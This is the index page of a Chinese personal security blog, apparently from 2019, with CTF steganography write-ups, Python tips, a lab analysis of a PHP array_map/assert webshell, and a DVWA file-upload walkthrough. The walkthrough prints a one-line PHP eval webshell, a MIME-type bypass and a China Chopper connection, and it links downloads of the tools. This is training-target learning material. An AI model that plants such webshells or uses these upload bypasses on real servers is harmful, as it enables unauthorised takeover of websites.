<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>37° &#39;s blog</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="37° &#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="37° &#39;s blog">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="37° &#39;s blog">
  
    <link rel="alternative" href="/atom.xml" title="37° &#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  <link rel="stylesheet" href="/css/style.css">
  
<script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

  
<!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-85415703-1', 'auto');
  ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>

  
      <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
<script>AV.initialize("your_app_id", "your_app_key");</script>
<script src="/js/Counter.js"></script>
  
</head></html>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://i.loli.net/2019/01/18/5c41d6b1f13df.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">崔强</a></h1>
		</hgroup>

		
		<p class="header-subtitle">欢迎光临！</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="/cuiqiang0.github.io" title="github">github</a>
					        
								<a class="mail" target="_blank" href="/702078220@qq.com" title="mail">mail</a>
					        
								<a class="qq" target="_blank" href="/702078220" title="qq">qq</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/python环境搭建/" style="font-size: 10px;">python环境搭建</a> <a href="/tags/技术分享/" style="font-size: 10px;">技术分享</a> <a href="/tags/漏洞复现/" style="font-size: 20px;">漏洞复现</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">崔强</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://i.loli.net/2019/01/18/5c41d6b1f13df.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">崔强</h1>
			</hgroup>
			
			<p class="header-subtitle">欢迎光临！</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="/cuiqiang0.github.io" title="github">github</a>
			        
						<a class="mail" target="_blank" href="/702078220@qq.com" title="mail">mail</a>
			        
						<a class="qq" target="_blank" href="/702078220" title="qq">qq</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-python类型转换" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/04/28/python类型转换/" class="article-date">
  	<time datetime="2019-04-28T11:17:22.000Z" itemprop="datePublished">2019-04-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/28/python类型转换/">
        python类型转换
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>int(x [,base ])    将x转换为一个整数</li>
<li>long(x [,base ])    将x转换为一个长整数</li>
<li>float(x )    将x转换到一个浮点数</li>
<li>complex(real [,imag ])    创建一个复数</li>
<li>str(x )    将对象 x 转换为字符串</li>
<li>repr(x )    将对象 x 转换为表达式字符串</li>
<li>eval(str )    用来计算在字符串中的有效Python表达式,并返回一个对象</li>
<li>tuple(s )    将序列 s 转换为一个元组</li>
<li>list(s )    将序列 s 转换为一个列表</li>
<li>chr(x )    将一个整数转换为一个字符</li>
<li>unichr(x )    将一个整数转换为Unicode字符</li>
<li>ord(x )    将一个字符转换为它的整数值</li>
<li>hex(x )    将一个整数转换为一个十六进制字符串</li>
<li>oct(x )    将一个整数转换为一个八进制字符串</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        
<div class="counter-tag counter">
    <span id="/2019/04/28/python类型转换/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="python类型转换">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-图片隐写2" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/04/11/图片隐写2/" class="article-date">
  	<time datetime="2019-04-11T13:17:13.000Z" itemprop="datePublished">2019-04-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/11/图片隐写2/">
        图片隐写
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文写的是在<strong>kali Linux</strong>系统完成的一道图片隐写的做法，在<strong>Windows</strong>系统我也试着用了，但是感觉<strong>scalpel</strong>这个工具与<strong>Windows</strong>不兼容，最后修复图片的时候总是跑不出来，因此只能改为<strong>kali</strong>，我不知道为啥<strong>Windows</strong>不能跑出来，希望有知道的大佬能告诉我。</p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
<li>kali Linux</li>
<li>binwalk</li>
<li>foremost</li>
<li>scalpel</li>
<li>winhex</li>
</ul>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>链接：<a href="http://daka.whaledu.com:9999/challenges" target="_blank" rel="noopener">http://daka.whaledu.com:9999/challenges</a>  <strong>隐写题（黑客透视镜）</strong></p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>首先，对于图片隐写的题目，都是常规操作来一波，先查看了一下属性，拉进记事本之后发现什么也没有发现，然后就是对图片进行分析了，我首先使用的是<strong>binwalk</strong>，分析如下：<br><img src="https://i.loli.net/2019/04/12/5cafe5df3f44b.png" alt=""><br>分析了一下，发现这个图片包含三个png图片，因此接下来就是把图片分离出来了，我用的是<strong>foremost</strong>，分离如下：<br><img src="https://i.loli.net/2019/04/12/5cafe6ce9d2f8.png" alt=""><br>按照正常情况下，应该能分离出三个图片，可是分离之后我发现并不是，得到的文件里只有这个<br><img src="https://i.loli.net/2019/04/12/5cafe736ce052.png" alt=""><br>这说明并没有成功，这就使我很纳闷了，然后我用<strong>16进制工具winhex</strong>查看了一下图片的十六进制，并百度搜索了一下<strong>jpg图片的文件头和文件尾</strong>。</p>
<blockquote>
<p>JPEG (jpg) 文件头：FFD8FF 文件尾：FF D9</p>
</blockquote>
<p><strong>winhex</strong>打开得到：<br><img src="https://i.loli.net/2019/04/12/5cafeb6a78fcc.png" alt=""><br><img src="https://i.loli.net/2019/04/12/5cafeb7d374bc.png" alt="">　<br><img src="https://i.loli.net/2019/04/12/5cafeb90c66a7.png" alt=""><br>做到这里，我就百度了一下文件修复文具，找到一个<strong>scalpel</strong>，说是很强大，其实确实是，挺好用的，在<strong>kali</strong>上，你需要下载<strong>scalpel的配置文件scalpel.conf</strong>，也可以在Windows上下载一个复制上去，然后你需要配置<strong>scalpel.conf</strong>，如下图：<br><img src="https://i.loli.net/2019/04/12/5cafee3535e82.png" alt=""><br>然后就可以在<strong>kali</strong>上运行，如下图：<br><img src="https://i.loli.net/2019/04/12/5caff0ec55670.png" alt=""><br>打开<strong>flag</strong>文件看到分离的图片：<br><img src="https://i.loli.net/2019/04/12/5caff1a942cfa.png" alt=""></p>
<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术分享/">技术分享</a></li></ul>
	</div>

      

      
        
<div class="counter-tag counter">
    <span id="/2019/04/11/图片隐写2/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="图片隐写">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-共存py两种版本的方法" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/04/10/共存py两种版本的方法/" class="article-date">
  	<time datetime="2019-04-10T12:53:56.000Z" itemprop="datePublished">2019-04-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/10/共存py两种版本的方法/">
        两种py版本共存的方法
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>最近跑脚本，发现网上许多脚本都是python2的脚本，而自己一直学习都是python3，每次运行python2的脚本都非常的难受，之后下载了一个python2，并把2版本也添加了环境变量，但是发现在<strong>cmd</strong>中输入<strong>python</strong>之后总是显示<strong>python2</strong>的版本，想用<strong>python3</strong>的版本又用不了了，大佬勿喷，写出来希望对不会的有用吧。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p><strong>python2</strong>输入<br>    py -2</p>
<p><strong>python3</strong>输入<br>    py -3<br>如下图：</p>
<p><img src="https://i.loli.net/2019/04/10/5cade9071fca9.png" alt=""></p>
<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        
<div class="counter-tag counter">
    <span id="/2019/04/10/共存py两种版本的方法/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="两种py版本共存的方法">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-图片隐写" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/04/10/图片隐写/" class="article-date">
  	<time datetime="2019-04-10T12:04:11.000Z" itemprop="datePublished">2019-04-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/10/图片隐写/">
        记一道图片隐写题
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="http://daka.whaledu.com:9999/challenges" target="_blank" rel="noopener">http://daka.whaledu.com:9999/challenges</a><strong>隐写题追加数据</strong></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
<li>pngcheck</li>
<li>WinHex</li>
<li>QR_Research</li>
</ul>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>下载下来图片之后发现是png图片，首先我使用了<strong>pngcheck-2.3.0-win32</strong>分析了一下，发下如下：<br><img src="https://i.loli.net/2019/04/10/5caddd3840a4c.png" alt=""><br>从上图可以看出，其中有一个<strong>193</strong>位的插入数据，之后我用<strong>WinHex</strong>16进制工具打开，把其中193位长度的数据提取出来，如下图：<br><img src="https://i.loli.net/2019/04/10/5cadde5fac4f5.png" alt=""><br>截取其中的数据之后，就需要把它解密出来，我用了下面这个解密<strong>IDAT</strong>数据的脚本</p>
<pre><code>#python2运行


import zlib
import binascii

IDAT=&apos;789CA552B911C3300C5B09D87FB99C65E2A11A17915328FC8487C0C7E17BCEF57CCFAFA27CAB749B8A8E3E754C4C15EF25F934CDFF9DD7C0D413EB7D9E18D16F15D2EB0B2BF1D44C6AE6CAB1664F11933436A9D0D8AA6B5A2D09BA785E58EC8AB264111C0330A148170B90DA0E582CF388073676D2022C50CA86B63175A3FD26AE1ECDF2C658D148E0391591C9916A795432FBDDF27F6D2B71476C6C361C052FAA846A91B22C76A25878681B7EA904A950E28887562FDBC59AF6DFF901E0DBC1AB&apos;.decode(&apos;hex&apos;)
result = binascii.hexlify(zlib.decompress(IDAT))
bin = result.decode(&apos;hex&apos;)
print bin
print &apos;\r\n&apos;
print (len(bin))
</code></pre><p>跑出来的结果是<br><img src="https://i.loli.net/2019/04/10/5caddfa7ab53b.png" alt=""><br>我们发现其中只有0和1，并且是<strong>1024</strong>个长度，而且1024刚好等于32×32，因此猜测这是一个二维码图形，用了一个脚本转换了一下，脚本如下：</p>
<pre><code>#python3运行
from PIL import Image

MAX = 32
pic = Image.new(&apos;RGB&apos;,(MAX*9,MAX*9))
#1.txt为存放1024位的txt文件
f = open(&apos;C:\\Users\\DELL\\Desktop\\1\\1.txt&apos;,&apos;r&apos;)
str = f.read()
i = 0
for y in range(0,MAX*9,9):
    for x in range(0,MAX*9,9):
        if(str[i] == &apos;1&apos;):
            for n in range(9):
                for j in range(9):
                    pic.putpixel([x+j,y+n],(0,0,0))
        else:
            for k in range(9):
                for l in range(9):
                    pic.putpixel([x+l,y+k],(255,255,255))
        i = i+1

pic.show()
pic.save(&quot;flag.png&quot;)
f.close()
</code></pre><p>跑出来之后得到一张二维码，扫描得到flag。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        
<div class="counter-tag counter">
    <span id="/2019/04/10/图片隐写/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="记一道图片隐写题">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-墨者WebShell代码分析溯源(第6题)" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/04/03/墨者WebShell代码分析溯源(第6题)/" class="article-date">
  	<time datetime="2019-04-03T05:59:10.000Z" itemprop="datePublished">2019-04-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/03/墨者WebShell代码分析溯源(第6题)/">
        墨者WebShell代码分析溯源(第6题)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>过狗过盾无特征无动态函数PHP一句话</p>
<p>原理：<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>进入漏洞之后，发现一个<strong>下载系统源码</strong>，下载之后发现在<strong>www_bak\Assets\upload\</strong>目录有一个<strong>pic3.jpg.php</strong>，很明显是黑客上传上去生成一句话木马的文件，打开之后如下图所示：<br><img src="https://i.loli.net/2019/04/03/5ca44da94909b.jpg" alt=""></p>
<blockquote>
<p>array_map函数： 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p>
</blockquote>
<p>分析上述代码，可以发现黑客上传的密码<strong>POST</strong>，并发现array_map回调函数，这段代码就相当于base64_decode($_REQUEST[‘e’])($_POST[‘POST’])，array_map的第一个参数需要是回调函数，所以这个后门：<br><strong>array_map(assert,(array)base64_decode($_REQUEST[‘POST’]));</strong>array_map第二个参数需要再镶嵌一个assert。</p>
<h2 id="构造url"><a href="#构造url" class="headerlink" title="构造url"></a>构造url</h2><p>构造url就比较简单了，直接<strong>ip+上传目录+参数</strong>，构造好后就是：<br><a href="http://219.153.49.228:48515/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0" target="_blank" rel="noopener">http://219.153.49.228:48515/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0</a></p>
<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>构造完成url，直接菜刀连接，如下图：<br><img src="https://i.loli.net/2019/04/03/5ca47743b44a4.jpg" alt=""><br>成功连接，找到key<br><img src="https://i.loli.net/2019/04/03/5ca477969aa2e.jpg" alt=""><br><img src="https://i.loli.net/2019/04/03/5ca477c7471d4.jpg" alt=""></p>
<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
	</div>

      

      
        
<div class="counter-tag counter">
    <span id="/2019/04/03/墨者WebShell代码分析溯源(第6题)/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="墨者WebShell代码分析溯源(第6题)">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-DVWA（文件上传篇）" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/04/02/DVWA（文件上传篇）/" class="article-date">
  	<time datetime="2019-04-02T05:59:10.000Z" itemprop="datePublished">2019-04-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/02/DVWA（文件上传篇）/">
        DVWA（文件上传篇）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><blockquote>
<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”的这个行为是没有问题的，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。<br>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p>
</blockquote>
<h2 id="Webshell简介"><a href="#Webshell简介" class="headerlink" title="Webshell简介"></a>Webshell简介</h2><blockquote>
<p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。<br>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。<strong>&lt;?php eval($_POST[a]); ?&gt;</strong>就是一个最常见最原始的小马。</p>
</blockquote>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><strong>中国菜刀</strong>链接：<a href="https://pan.baidu.com/s/1rhPJDj5qAUa5nKT2zseIoA" target="_blank" rel="noopener">https://pan.baidu.com/s/1rhPJDj5qAUa5nKT2zseIoA</a><br>提取码：84h2</p>
<p><strong>burpsuite</strong>链接：<a href="https://pan.baidu.com/s/1Qe5PyAV5XYrok3DAHxcMlg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Qe5PyAV5XYrok3DAHxcMlg </a><br>提取码：f6e9</p>
<h2 id="提醒"><a href="#提醒" class="headerlink" title="提醒"></a>提醒</h2><p><a href="https://baike.baidu.com/item/中华人民共和国网络安全法/16843044?fr=aladdin" target="_blank" rel="noopener">[https://baike.baidu.com/item/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/16843044?fr=aladdin]</a></p>
<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>首先，查看一下源码，如下：</p>
<pre><code>&lt;?php
if (isset($_POST[&apos;Upload&apos;])) {

        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
        $target_path = $target_path . basename( $_FILES[&apos;uploaded&apos;][&apos;name&apos;]);

        if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {

            echo &apos;&lt;pre&gt;&apos;;
            echo &apos;Your image was not uploaded.&apos;;
            echo &apos;&lt;/pre&gt;&apos;;

          }
          else {

            echo &apos;&lt;pre&gt;&apos;;
            echo $target_path . &apos; succesfully uploaded!&apos;;
            echo &apos;&lt;/pre&gt;&apos;;

        }

    }
?&gt;
</code></pre><p>从源码中可以看出，这个<strong>low</strong>级别的是比较简单的，其中在<strong>if</strong>判断中，只要上传了对象，就可以上传成功，因此我们可以直接上传包含<strong>一句话木马</strong>的<strong>PHP</strong>脚本。木马脚本如下：<br><img src="https://i.loli.net/2019/04/01/5ca1f42357535.jpg" alt=""></p>
<p>然后在DVWA页面中上传我们的脚本文件，如下图可知上传成功：</p>
<p><img src="https://i.loli.net/2019/04/01/5ca1f7073b7d4.jpg" alt=""></p>
<p>接下来可以复制路径，访问我们上传的文件，发现如图所示：</p>
<p><img src="https://i.loli.net/2019/04/01/5ca1f77d367d3.jpg" alt=""></p>
<p>可以看到什么也没有，其实这已经代表我们上传成功了，接下来需要我们使用<strong>中国菜刀</strong>来连接。</p>
<h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>上传成功之后就可以使用我们的菜刀来连接了，中国菜刀的使用也很简单，在使用之前最好把电脑上的安全软件先关闭，要不然菜刀一运行就被杀掉了，打开菜刀之后，直接在主页面右键，点击添加，如图所示：<br><img src="https://i.loli.net/2019/04/01/5ca1fb30dffce.jpg" alt=""></p>
<p>添加成功之后，就可以得到下面的界面：</p>
<p><img src="https://i.loli.net/2019/04/01/5ca1fb9f48474.jpg" alt=""><br>可以看到我们传上去的php脚本文件，到此，我们可以删除，下载，添加，修改这个网站的所有内容。</p>
<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>首先，我们来看一下<strong>medium</strong>级别的源码</p>
<pre><code>&lt;?php
if (isset($_POST[&apos;Upload&apos;])) {

        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
        $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
        $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];
        $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];
        $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];

        if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){


            if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {

                echo &apos;&lt;pre&gt;&apos;;
                echo &apos;Your image was not uploaded.&apos;;
                echo &apos;&lt;/pre&gt;&apos;;

              } else {

                echo &apos;&lt;pre&gt;&apos;;
                echo $target_path . &apos; succesfully uploaded!&apos;;
                echo &apos;&lt;/pre&gt;&apos;;

                }
        }
        else{
            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
        }
    }
?&gt;
</code></pre><p>查看源码，发现其中<strong>if (($uploaded_type == “image/jpeg”) &amp;&amp; ($uploaded_size &lt; 100000))</strong>这里限制了上传的文件类型只能是<strong>image/jpeg</strong>格式的和文件的大小要小于<strong>100000</strong>个字节，我们可以还按上面的方法试一下，发现如下图所示：<br><img src="https://i.loli.net/2019/04/01/5ca2050c79882.jpg" alt=""><br>我们发现这样是不可行的，因此要另寻其径了，我们可以采用修改上传文件类型（mime）来上传我们的脚本文件，首先先打开抓包工具<strong>burp suite</strong>，并设置好浏览器代理，然后上传在<strong>low</strong>中所用的脚本文件，上传后抓到包如图所示：<br><img src="https://i.loli.net/2019/04/01/5ca2044a34b3f.jpg" alt=""><br>然后就可以上传成功了，接下来就可以愉快的连菜刀了，和上面的步骤一样，就不多作介绍了。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>mime</strong></p>
<blockquote>
<p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。每个MIME类型由两部分组成，前面是数据的大类别，后面定义具体的种类。</p>
</blockquote>
<p><strong>常见的mime</strong></p>
<ul>
<li>超文本标记语言文本 .html text/html</li>
<li>xml文档 .xml text/xml</li>
<li>XHTML文档 .xhtml application/xhtml+xml</li>
<li>普通文本 .txt text/plain</li>
<li>RTF文本 .rtf application/rtf</li>
<li>PDF文档 .pdf application/pdf</li>
<li>Microsoft Word文件 .word application/msword</li>
<li>PNG图像 .png image/png</li>
<li>GIF图形 .gif image/gif</li>
<li>JPEG图形 .jpeg,.jpg image/jpeg</li>
<li>au声音文件 .au audio/basic</li>
<li>GZIP文件 .gz application/x-gzip</li>
<li>TAR文件 .tar application/x-tar</li>
<li>任意的二进制数据 application/octet-stream</li>
</ul>
<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
	</div>

      

      
        
<div class="counter-tag counter">
    <span id="/2019/04/02/DVWA（文件上传篇）/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="DVWA（文件上传篇）">
         &nbsp;
        view
    </span>
</div>

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-DVWA漏洞靶机环境搭建" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/28/DVWA漏洞靶机环境搭建/" class="article-date">
  	<time datetime="2019-03-28T12:56:02.000Z" itemprop="datePublished">2019-03-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/28/DVWA漏洞靶机环境搭建/">
        DVWA漏洞靶机环境搭建
        
      </a>
    </h1>
  

      </header>
      
    
